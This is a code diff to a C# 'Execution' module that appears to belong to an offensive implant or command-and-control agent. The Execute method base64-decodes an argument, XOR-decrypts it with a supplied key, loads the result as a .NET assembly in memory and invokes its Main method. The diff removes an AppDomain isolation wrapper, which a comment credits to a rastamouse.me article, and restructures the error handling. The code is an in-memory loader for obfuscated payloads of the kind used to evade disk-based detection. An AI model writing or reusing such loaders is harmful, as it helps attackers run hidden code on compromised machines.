@@ -2,6 +2,8 @@
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
+using System.Security.Permissions;
+using System.Security;
 
 namespace Execution
 {
@@ -46,27 +48,9 @@ namespace Execution
 
         public string Execute(string[] args)
         {
-            AppDomainSetup domainSetup = new AppDomainSetup();
-            domainSetup.ApplicationBase = AppDomain.CurrentDomain.BaseDirectory;
-            AppDomain executeAssemblyDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
-
             try
             {
                 byte[] assemblyBytes = Zor(Convert.FromBase64String(args[0]), args[1]);
-                AssemblyRunner runner = (AssemblyRunner)executeAssemblyDomain.CreateInstanceAndUnwrap(typeof(AssemblyRunner).Assembly.FullName, typeof(AssemblyRunner).FullName);
-                AppDomain.Unload(executeAssemblyDomain);
-                return runner.LoadAssembly(assemblyBytes, args);
-            }
-            catch (Exception ex)
-            {
-                return ex.ToString();
-            }
-        }
-        //https://rastamouse.me/net-reflection-and-disposable-appdomains/ from here but dosen't work yet
-        private class AssemblyRunner : MarshalByRefObject
-        {
-            public string LoadAssembly(byte[] assemblyBytes, string[] args)
-            {
                 Assembly assembly = Assembly.Load(assemblyBytes);
                 foreach (Type type in assembly.GetExportedTypes())
                 {
@@ -90,13 +74,18 @@ namespace Execution
                 }
                 return "Main method not found";
             }
-            private string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
+            catch (Exception ex)
             {
-                int length = endIndex - startIndex + 1;
-                string[] outputArray = new string[length];
-                Array.Copy(inputArray, startIndex, outputArray, 0, length);
-                return outputArray;
+                return ex.ToString();
             }
+
+        }
+        private string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
+        {
+            int length = endIndex - startIndex + 1;
+            string[] outputArray = new string[length];
+            Array.Copy(inputArray, startIndex, outputArray, 0, length);
+            return outputArray;
         }
 
         private byte[] Zor(byte[] input, string key)
